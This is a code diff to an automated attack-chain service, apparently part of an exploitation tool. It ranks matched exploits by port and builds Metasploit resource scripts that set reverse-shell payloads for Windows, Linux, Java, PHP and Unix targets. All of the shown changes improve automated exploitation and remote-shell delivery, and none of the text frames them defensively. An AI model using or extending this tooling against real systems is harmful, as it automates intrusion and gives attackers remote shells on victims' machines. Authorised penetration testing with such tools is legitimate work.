@@ -209,6 +209,9 @@ class AttackChainService extends EventEmitter {
         const maxExploits = 5; // Limit to top 5 most promising exploits
         let exploitCount = 0;
 
+        // Diversification: Limit exploits per port/service to avoid trying 5 FTP exploits and 0 HTTP
+        const exploitsPerPort = {};
+
         for (const ex of matchedExploits) {
             if (exploitCount >= maxExploits) break;
             if (addedExploits.has(ex.exploit_id)) continue;
@@ -222,7 +225,14 @@ class AttackChainService extends EventEmitter {
                 continue;
             }
 
+            // Diversification check: Max 2 exploits per port
+            const portKey = ex.port || 'unknown';
+            if (!exploitsPerPort[portKey]) exploitsPerPort[portKey] = 0;
+            if (exploitsPerPort[portKey] >= 2) continue;
+
             addedExploits.add(ex.exploit_id);
+            exploitsPerPort[portKey]++;
+
             steps.push({
                 name: `Exploit: ${ex.exploit_title}`,
                 type: 'exploit',
@@ -231,6 +241,26 @@ class AttackChainService extends EventEmitter {
                 targetPort: ex.port
             });
             exploitCount++;
+        }
+
+        // If we still have room after diversification, fill up with remaining best exploits
+        if (exploitCount < maxExploits) {
+            for (const ex of matchedExploits) {
+                if (exploitCount >= maxExploits) break;
+                if (addedExploits.has(ex.exploit_id)) continue;
+                if (!ex.exploit_code) continue;
+                if (ex.exploit_db_id && (ex.exploit_db_id.startsWith('auxiliary/') || ex.exploit_db_id.startsWith('post/'))) continue;
+
+                addedExploits.add(ex.exploit_id);
+                steps.push({
+                    name: `Exploit: ${ex.exploit_title}`,
+                    type: 'exploit',
+                    description: `${ex.exploit_title} → Port ${ex.port} (${ex.service || 'unknown'} ${ex.service_version || ''}) [Confidence: ${ex.match_confidence}%]`,
+                    exploitId: ex.exploit_id,
+                    targetPort: ex.port
+                });
+                exploitCount++;
+            }
         }
 
         if (exploitCount === 0) {
@@ -758,16 +788,29 @@ except:
                             // Standard net listeners (ShellService) expect a raw shell connection, not Meterpreter.
                             if (!modulePath.startsWith('auxiliary') && !modulePath.startsWith('post')) {
                                 let payload = 'cmd/unix/reverse'; // Default safe fallback
-                                const platform = (exploit.platform || '').toLowerCase();
+                                let platform = (exploit.platform || '').toLowerCase();
+
+                                // Fallback: Guess platform from module path if missing or generic
+                                if (!platform || platform === 'multi' || platform === 'unix') {
+                                    if (modulePath.includes('/windows/')) platform = 'windows';
+                                    else if (modulePath.includes('/linux/')) platform = 'linux';
+                                    else if (modulePath.includes('/freebsd/') || modulePath.includes('/netbsd/') || modulePath.includes('/openbsd/')) platform = 'unix';
+                                    else if (modulePath.includes('/solaris/')) platform = 'unix';
+                                    else if (modulePath.includes('/osx/')) platform = 'osx';
+                                }
 
                                 if (platform.includes('windows')) {
-                                    payload = 'windows/shell_reverse_tcp';
+                                    if (platform.includes('_cmd')) payload = 'cmd/windows/reverse_powershell';
+                                    else payload = 'windows/shell_reverse_tcp';
                                 } else if (platform.includes('linux')) {
-                                    payload = 'linux/x86/shell_reverse_tcp';
+                                    if (platform.includes('_cmd')) payload = 'cmd/unix/reverse';
+                                    else payload = 'linux/x86/shell_reverse_tcp';
                                 } else if (platform.includes('java')) {
                                     payload = 'java/shell_reverse_tcp';
                                 } else if (platform.includes('php')) {
                                     payload = 'php/reverse_php';
+                                } else if (platform.includes('unix') || platform.includes('bsd') || platform.includes('solaris')) {
+                                    payload = 'cmd/unix/reverse';
                                 }
 
                                 rcLines.push('set PAYLOAD ' + payload);
@@ -836,7 +879,8 @@ except:
                                 const bundlePath = path.join(msfRoot, 'vendor', 'bundle');
                                 const envVars = [
                                     'BUNDLE_GEMFILE="' + gemfilePath + '"',
-                                    'RAILS_ENV=production'
+                                    'RAILS_ENV=production',
+                                    'BUNDLE_DISABLE_SHARED_GEMS=1'
                                 ];
                                 // Only set BUNDLE_PATH if vendor/bundle exists (local install mode)
                                 if (fs.existsSync(bundlePath)) {
